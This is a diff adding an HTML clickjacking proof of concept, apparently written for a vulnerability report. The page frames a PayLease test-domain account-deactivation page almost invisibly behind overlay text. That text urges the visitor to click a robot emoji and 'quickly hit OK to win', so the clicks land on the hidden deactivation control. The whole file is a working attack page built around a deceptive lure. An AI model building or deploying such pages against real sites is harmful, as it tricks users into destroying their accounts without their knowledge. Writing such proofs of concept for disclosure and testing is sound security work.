@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ClickJacking PoC</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        /* Style for Text Overlay 1 */
+        .text-1 {
+            position: absolute;
+            top: 520px; /* Adjust position as needed */
+            left: 1200px; /* Adjust position as needed */
+            color: white;
+            font-size: 24px; /* Larger font size for visibility */
+            font-weight: bold;
+            background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent background */
+            padding: 10px;
+            border-radius: 5px;
+            pointer-events: none; /* Allow clicks to pass through */
+            z-index: 2; /* Ensure text is above the iframe */
+        }
+        /* Style for Text Overlay 2 */
+        .text-2 {
+            position: absolute;
+            top: 70px; /* Adjust position as needed */
+            right: 600px; /* Adjust position as needed */
+            color: white;
+            font-size: 24px; /* Larger font size for visibility */
+            font-weight: bold;
+            background-color: rgba(0, 0, 0, 0.5); /* Semi-transparent background */
+            padding: 10px;
+            border-radius: 5px;
+            pointer-events: none; /* Allow clicks to pass through */
+            z-index: 2; /* Ensure text is above the iframe */
+        }
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1; /* Ensure iframe is below the text */
+            opacity: 0.1; /* Adjust transparency here */
+            border: none;
+        }
+    </style>
+</head>
+<body>
+    <iframe src="https://test.paylease.net/resident/profile/account/deactivate_account"></iframe>
+    <div class="text-1">🤖</div>
+    <div class="text-2">🚨 Click on the 🤖 robot and then quickly hit OK to win! 🏆 Don’t wait—your chance is now! ⏳</div>
+</body>
+</html>
